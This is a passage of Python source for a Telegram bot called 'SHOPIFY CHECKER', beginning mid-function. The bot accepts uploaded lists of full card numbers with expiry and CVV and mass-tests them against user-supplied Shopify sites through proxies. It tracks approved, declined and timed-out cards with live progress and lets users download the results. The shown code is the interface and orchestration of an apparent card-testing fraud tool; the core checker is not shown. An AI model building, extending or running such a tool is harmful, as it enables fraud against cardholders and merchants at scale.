                result = await asyncio.wait_for(result_queue.get(), timeout=0.1)
                results.append(result)
            except asyncio.TimeoutError:
                # Actualizar aunque no haya resultados nuevos
                if progress_callback and time.time() - last_update >= 0.5:
                    await progress_callback(processed, approved, declined, timeout, len(cards))
                    last_update = time.time()
                continue
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        while not result_queue.empty():
            result = await result_queue.get()
            results.append(result)
        
        elapsed = time.time() - start_time
        return results, approved, declined, timeout, elapsed

# ================== VARIABLES GLOBALES ==================
db = None
user_manager = None
checker = None
card_service = None
cancel_mass = {}
user_state = {}  # user_id -> current_menu
active_mass = set()  # user_id con mass en curso

# ================== MENÚ PRINCIPAL ==================
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit: bool = False):
    text = (
        "🤖 *SHOPIFY CHECKER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Elige una opción:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💳 CHECK CARD", callback_data="menu_check")],
        [InlineKeyboardButton("📦 MASS CHECK", callback_data="menu_mass")],
        [InlineKeyboardButton("🌐 SITES", callback_data="menu_sites")],
        [InlineKeyboardButton("🔌 PROXIES", callback_data="menu_proxies")],
        [InlineKeyboardButton("🧾 CARDS", callback_data="menu_cards")],
        [InlineKeyboardButton("📊 STATS", callback_data="menu_stats")],
        [InlineKeyboardButton("⚙️ SETTINGS", callback_data="menu_settings")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if edit:
        await update.callback_query.edit_message_text(
            text, parse_mode="Markdown", reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

# ================== SUBMENÚ MASS CHECK ==================
async def show_mass_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    
    cards_count = len(user_data["cards"])
    sites_count = len(user_data["sites"])
    proxies_count = len(user_data["proxies"])
    
    status = []
    if cards_count == 0:
        status.append("❌ No cards")
    if sites_count == 0:
        status.append("❌ No sites")
    if proxies_count == 0:
        status.append("❌ No proxies")
    
    text = (
        "📦 *MASS CHECK*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "*Steps:*\n"
        "1️⃣ Add cards (.txt)\n"
        "2️⃣ Add sites\n"
        "3️⃣ Add proxies\n"
        "4️⃣ Start mass check\n\n"
        f"*Current status:*\n"
        f"• Cards: {cards_count}\n"
        f"• Sites: {sites_count}\n"
        f"• Proxies: {proxies_count}\n"
    )
    
    if status:
        text += f"\n⚠️ {', '.join(status)}"
    
    keyboard = []
    
    if cards_count > 0 and sites_count > 0 and proxies_count > 0:
        keyboard.append([InlineKeyboardButton("▶️ Start mass", callback_data="mass_start")])
    
    keyboard.append([InlineKeyboardButton("📄 Upload cards", callback_data="mass_upload")])
    keyboard.append([InlineKeyboardButton("⚙️ Workers settings", callback_data="mass_workers")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_main")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== INICIAR MASS CHECK ==================
async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    # Verificar rate limit
    allowed, msg = await user_manager.check_rate_limit(user_id, "mass")
    if not allowed:
        await query.edit_message_text(msg)
        return
    
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    sites = user_data["sites"]
    proxies = user_data["proxies"]
    
    if not cards or not sites or not proxies:
        await query.edit_message_text("❌ Missing cards, sites or proxies.")
        await asyncio.sleep(2)
        await show_mass_menu(update, context)
        return
    
    valid_cards = []
    for card_str in cards:
        card_data = CardValidator.parse_card(card_str)
        if card_data:
            valid_cards.append(card_data)
    
    if not valid_cards:
        await query.edit_message_text("❌ No valid cards found.")
        return
    
    # Marcar que este usuario tiene un mass activo
    active_mass.add(user_id)
    cancel_mass[user_id] = False
    
    # Mensaje inicial con barra vacía
    bar = create_progress_bar(0, len(valid_cards))
    text = (
        f"📦 *MASS CHECK IN PROGRESS*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"Progress: {bar} 0/{len(valid_cards)}\n\n"
        f"✅ Approved: 0\n"
        f"❌ Declined: 0\n"
        f"⏱ Timeout: 0\n\n"
        f"⚡ Speed: 0.0 cards/s\n"
        f"⏳ Elapsed: 0s"
    )
    
    keyboard = [[InlineKeyboardButton("⏹ STOP", callback_data="mass_stop")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    progress_msg = await query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )
    
    async def progress_callback(proc: int, apr: int, dec: int, to: int, total: int):
        if cancel_mass.get(user_id, False):
            return
        
        elapsed = time.time() - start_time
        speed = proc / elapsed if elapsed > 0 else 0
        bar = create_progress_bar(proc, total)
        
        # Determinar ícono según tasa de timeout
        timeout_rate = to / proc if proc > 0 else 0
        if timeout_rate > 0.3:
            icon = "🔴"
        elif timeout_rate > 0.15:
            icon = "🟡"
        else:
            icon = "🟢"
        
        text = (
            f"{icon} *MASS CHECK IN PROGRESS*\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"Progress: {bar} {proc}/{total}\n\n"
            f"✅ Approved: {apr}\n"
            f"❌ Declined: {dec}\n"
            f"⏱ Timeout: {to}\n\n"
            f"⚡ Speed: {speed:.1f} cards/s\n"
            f"⏳ Elapsed: {format_time(elapsed)}"
        )
        
        try:
            await progress_msg.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup)
        except:
            pass
    
    start_time = time.time()
    results, approved, declined, timeout, elapsed = await card_service.check_mass(
        user_id=user_id,
        cards=valid_cards,
        sites=sites,
        proxies=proxies,
        progress_callback=progress_callback
    )
    
    await user_manager.increment_checks(user_id, "mass")
    active_mass.discard(user_id)
    
    # Verificar si fue cancelado
    if cancel_mass.get(user_id, False):
        cancel_mass[user_id] = False
        text = (
            f"⏹ *PROCESS STOPPED*\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"Processed: {len(results)}/{len(valid_cards)}\n"
            f"✅ Approved: {approved}\n"
            f"❌ Declined: {declined}\n"
            f"⏱ Timeout: {timeout}\n\n"
            f"⏳ Elapsed: {format_time(elapsed)}"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Mass", callback_data="menu_mass")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await progress_msg.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup)
        return
    
    # Resumen final
    avg_speed = len(valid_cards) / elapsed if elapsed > 0 else 0
    text = (
        f"✅ *MASS CHECK COMPLETED*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"Processed: {len(valid_cards)} cards\n"
        f"✅ Approved: {approved}\n"
        f"❌ Declined: {declined}\n"
        f"⏱ Timeout: {timeout}\n\n"
        f"⏱ Time: {format_time(elapsed)}\n"
        f"⚡ Avg speed: {avg_speed:.1f} cards/s"
    )
    
    keyboard = [
        [InlineKeyboardButton("📄 Download results", callback_data="mass_download")],
        [InlineKeyboardButton("🔙 Back to menu", callback_data="menu_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await progress_msg.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    # Guardar resultados para descarga
    context.user_data['last_mass_results'] = results
    context.user_data['last_mass_cards'] = valid_cards

# ================== DETENER MASS CHECK ==================
async def mass_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    if user_id in active_mass:
        cancel_mass[user_id] = True
        await query.answer("⏹ Stopping mass check...")
    else:
        await query.answer("No active mass check.")

# ================== DOWNLOAD RESULTADOS ==================
async def mass_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    results = context.user_data.get('last_mass_results', [])
    cards = context.user_data.get('last_mass_cards', [])
    
    if not results:
        await query.answer("No results available.")
        return
    
    filename = f"mass_{user_id}_{int(time.time())}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"RESULTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {len(cards)} | Approved: {sum(1 for r in results if r.success)}\n")
        f.write("="*80 + "\n\n")
        
        for i, r in enumerate(results, 1):
            emoji = get_status_emoji(r.status)
            f.write(f"[{i}] {emoji} Card: {r.context.card_bin}xxxxxx{r.context.card_last4}\n")
            f.write(f"    Status: {r.status.value.upper()} ({r.confidence.value})\n")
            f.write(f"    Reason: {r.reason}\n")
            f.write(f"    Site: {r.context.site}\n")
            f.write(f"    Proxy: {r.context.proxy}\n")
            f.write(f"    Time: {r.context.response_time:.2f}s\n")
            f.write("-"*40 + "\n")
    
    with open(filename, "rb") as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename=filename,
            caption="📊 Mass check results"
        )
    
    os.remove(filename)
    await query.answer("Results sent!")

# ================== MANEJO DE BOTONES ==================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = update.effective_user.id
    
    # No permitir navegación si hay mass activo
    if user_id in active_mass and data != "mass_stop":
        await query.edit_message_text(
            "❌ Mass check in progress. Use STOP button to cancel."
        )
        return
    
    if data == "mass_start":
        await mass_start(update, context)
    elif data == "mass_stop":
        await mass_stop(update, context)
    elif data == "mass_download":
        await mass_download(update, context)
    elif data == "mass_workers":
        text = (
            "⚙️ *WORKERS SETTINGS*\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            f"Current max workers: `{MAX_WORKERS_PER_USER}`\n\n"
            "Workers are automatically optimized based on:\n"
            "• Number of alive proxies\n"
            "• Timeout rate\n\n"
            "To change the limit, use the command:\n"
            "`/setworkers [number]`"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_mass")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    elif data == "mass_upload":
        text = (
            "📄 *UPLOAD CARDS FOR MASS*\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "Send a `.txt` file with cards.\n\n"
            "Format:\n"
            "`NUMBER|MONTH|YEAR|CVV`\n\n"
            "One per line."
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_mass")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
        user_state[user_id] = "awaiting_cards_file"
    else:
        # Otros menús (simplificados para este ejemplo)
        if data == "menu_mass":
            await show_mass_menu(update, context)
        elif data == "menu_main":
            await show_main_menu(update, context, edit=True)
        else:
            # Respuesta genérica para otros menús
            await query.edit_message_text(
                f"Menú: {data}\n\nEsta función está en desarrollo.",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back", callback_data="menu_main")
                ]])
            )

# ================== MANEJO DE ARCHIVOS ==================
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return
    
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    text = file_content.decode('utf-8', errors='ignore')
    lines = text.splitlines()
    
    cards_added = []
    invalid = []
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if CardValidator.parse_card(line):
            cards_added.append(line)
        else:
            invalid.append(line)
    
    user_data = await user_manager.get_user_data(user_id)
    user_data["cards"].extend(cards_added)
    await user_manager.update_user_data(user_id, cards=user_data["cards"])
    
    response = (
        f"📥 *CARDS IMPORTED*\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"✅ Valid: {len(cards_added)}\n"
        f"❌ Invalid: {len(invalid)}"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Mass", callback_data="menu_mass")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=reply_markup)
    
    if user_id in user_state and user_state[user_id] == "awaiting_cards_file":
        del user_state[user_id]

# ================== COMANDO START ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_main_menu(update, context, edit=False)

# ================== COMANDO STOP ==================
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_mass:
        cancel_mass[user_id] = True
        await update.message.reply_text("⏹ Stopping mass check...")
    else:
        await update.message.reply_text("No active mass check.")

# ================== MAIN ==================
async def shutdown(application: Application):
    logger.info("🛑 Cerrando...")
    if checker:
        await checker.shutdown()
    if db:
        await db.shutdown()
    logger.info("✅ Cerrado")

async def post_init(application: Application):
    global db, user_manager, checker, card_service
    
    db = Database()
    await db.initialize()
    await db.cleanup_old_results()
    
    user_manager = UserManager(db)
    checker = UltraFastChecker()
    await checker.initialize()
    
    card_service = CardCheckService(db, user_manager, checker)
    
    logger.info("✅ Bot inicializado con barra de progreso en tiempo real")

def main():
    app = Application.builder().token(TOKEN).post_init(post_init).build()
    app.post_shutdown = shutdown

    # Comandos
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_command))
    
    # Manejador de botones
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # Manejador de documentos
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), document_handler))

    logger.info("🚀 Bot iniciado con barra de progreso en tiempo real")
    app.run_polling()

if __name__ == "__main__":
    main()
